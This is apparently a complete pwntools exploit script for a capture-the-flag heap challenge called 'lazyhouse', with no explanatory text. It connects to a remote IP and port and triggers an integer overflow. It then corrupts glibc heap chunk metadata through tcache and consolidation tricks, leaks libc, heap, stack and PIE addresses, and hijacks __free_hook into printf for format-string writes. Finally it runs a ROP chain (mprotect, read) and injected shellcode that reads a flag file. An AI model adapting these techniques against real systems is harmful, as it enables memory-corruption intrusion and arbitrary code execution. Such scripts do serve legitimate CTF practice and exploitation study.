from pwn import *
from heaputils import *

def buy(index,size,name,skip=False):
	p.sendlineafter("Your choice: ", "1")
	p.recvuntil("Your money:")
	money = int(p.recvline(),16)
	log.info("money: %d"%money)
	p.sendlineafter("Index:", str(index))
	p.sendlineafter("Size:",str(size))
	if not skip:
		p.sendafter("House:",name)

def super_house(name):
	p.sendlineafter("Your choice: ", "5")
	p.sendafter("House:",name)

def sell(index):
	p.sendlineafter("Your choice: ", "3")
	p.sendlineafter("Index:", str(index))

def upgrade(index, name):
	p.sendlineafter("Your choice: ", "4")
	p.sendlineafter("Index:", str(index))
	p.sendafter("House:",name)
	
def show(index):
	p.sendlineafter("Your choice: ", "2")
	p.sendlineafter("Index:", str(index))
	return p.recv(0x40)

def debug():
	PIE = get_PIE(p,7)
	print hex(PIE)
	script = ""
	bp = [0x1C8B]
	for x in bp:
		script += "b *0x%x\n"%(PIE+x)
	gdb.attach(p,gdbscript=script)
	
if __name__ == "__main__":

	context.os = 'linux'
	context.arch = 'amd64'
	
	sc = '''
	lea rdi, [rip + filename]
	mov rsi, 0
	mov rax, 2
	syscall

	mov rsi, rsp
	mov rdi, rax
	mov rdx, 0x1000
	mov rax, 0
	syscall

	mov rsi, rsp
	mov rdi, 1
	mov rdx, 0x1000
	mov rax, 1
	syscall
	
	filename: .string "/home/lazyhouse/flag"
	'''

	sc = asm(sc)

	libc = ELF("./libc.so.6")
	p = remote("3.115.121.123", 5731)
	# make me rich
	buy(0, 0x12c9fb4d812cc12, "",True)
	sell(0)
	log.success("i became very rich!")

	# exploit, uses the first upgrade
	buy(0, 0x80, "a"*0x80) # dont free this chunk! never!
	buy(1, 0x80, "b"*0x80)
	buy(2, 0x80, "c"*0x80)
	buy(3, 0x80, "d"*0x80)
	buy(4, 0x2a0, "e"*0x2a0)
	buy(5, 0x1000, "f"*0x80) # the chunk we are going to use to consolidate at phase 2
	for i in range(0x7):
		buy(6, 0x300, "g"*0x300)
		sell(6)	

	buy(6, 0x300, "g"*0x300)
	buy(7, 0x500, "e"*0x500)

	size = 0x7fc26e9af820 - 0x7fc26e9af260 - 0x160
	pay = "a"*0x80 + p64(0) + p64(size|1)
	upgrade(0, pay)
	sell(1)
	
	buy(1, 0x80, "\xdd"*0x80)
	sell(6)
	data = show(2)
	LIBC = u64(data[:8]) + 0x7f8197f31000 - 0x7f8198115ca0
	HEAP = u64(data[8:16])
	log.info("LIBC: 0x%x"%LIBC)
	log.info("HEAP: 0x%x"%HEAP)
	#gdb.attach(p)

	# prepare tcache step.1 set fd and bk, unset prev_inuse bit of 5\
	
	sell(7)
	pay = "0"*0x80 + p64(0) + p64(0x21) # metadata d
	pay += "1"*0x80 + p64(0) + p64(0x31) # metadata of e 
	buy(7, 0x3c0, pay)
	sell(3)
	sell(4)

	# prepare tcache step.2 set size
	for i in range(7):
		buy(3, 0x3a0, "\n") # high
		sell(3)
	buy(3, 0x390, "\n") # low bit
	sell(3)
	# 0x701

	target = HEAP + 0x7f9868949040 - 0x7f986894bcc0
	pay = "\xaa"*0x80+p64(0)+p64(0x21)+p64(0xdeadbeef)*2+p64(0x123456)+p64(target)+"\xbb"*0x60
	pay += p64(0)+p64(0x31)+p64(0xdeadbeef)*2+p64(target)+p64(0x123456)+"\xcc"*0x60
	pay = pay.ljust(0x3c0)
	pay += p64(0x700) + p64(0x1010)
	upgrade(7, pay)# now rule the world with consolidate

	sell(5)
	hook = LIBC + libc.symbols['__free_hook']
	pay = p64(hook)*(0x1700//8)
	buy(5, 0x1700, pay)
	
	# create super house
	pivot = LIBC + libc.symbols['printf']
	pay = p64(pivot)
	super_house(pay)
	
	def sanitize(num):
		if num == 0:
			return 65536
		else:
			return num	

	# ROP
	def fmt(fmt):
		buy(3, 0x80+len(fmt), fmt+"\x00")
		sell(3)

	# 15, 40
	# stack leak
	fmt("%15$pEOFEOF")
	data = p.recvuntil("EOFEOF")
	STACK = int(data.strip("EOFEOF"),16)
	retaddr = STACK - 0x00007ffc0d5f6c70 + 0x7ffc0d5f6b98
	log.info("STACK: 0x%x"%retaddr)
	

	# pie leak
	fmt("%9$pEOFEOF")
	data = p.recvuntil("EOFEOF")
	PIE = int(data.strip("EOFEOF"),16) + 0x7f5e501e5000 - 0x7f5e501e739a
	log.info("PIE: 0x%x"%PIE)
	
	target = retaddr
	addr = PIE + 0x5018
	for i in range(3):
		fmt("%{}c%15$hn".format(target & 0xffff))
		x = sanitize((addr >> (16*i)) & 0xffff)
		fmt("%{}c%41$hn".format(x))
		target = target + 2

	# write to upgrade cnt
	x = sanitize(0xff)
	fmt("%{}c%14$hn".format(x))

	# change houses to houses
	for i in range(3):
		houses = PIE + 0x5060 
		target = retaddr
		fmt("%{}c%15$hn".format(target & 0xffff))
		x = sanitize((houses+2*i) & 0xffff)
		fmt("%{}c%41$hn".format(x))

		# now 14$ is changed to houses+2*i. change its value to houses
		x = sanitize((houses>>(16*i)) & 0xffff)
		fmt("%{}c%14$hn".format(x))
	
	upgrade(0, p64(retaddr-0x30) + p64(0x1000) + p64(1337) + p64(hook) + p64(0x1000) + p64(1337))
	
	# ret slide + real rop
	libc_version_print = LIBC + 0x26c80
	ret = PIE + 0x213F
	pop_rdi = LIBC + 0x0000000000026542
	pop_rsi = LIBC + 0x0000000000026f9e
	pop_rdx = LIBC + 0x000000000012bda6
	
	realrop = ""
	realrop += p64(pop_rdi) + p64(PIE)
	realrop += p64(pop_rsi) + p64(0x1000)
	realrop += p64(pop_rdx) + p64(0x7)
	realrop += p64(LIBC + libc.symbols['mprotect'])
	realrop += p64(pop_rdi) + p64(0)
	realrop += p64(pop_rsi) + p64(PIE)
	realrop += p64(pop_rdx) + p64(0x1000)
	realrop += p64(LIBC + libc.symbols['read'])
	realrop += p64(PIE)

	
	ropchain = p64(ret) * (0x30) + realrop
	upgrade(0, ropchain)
	p.send(sc)
	p.interactive()
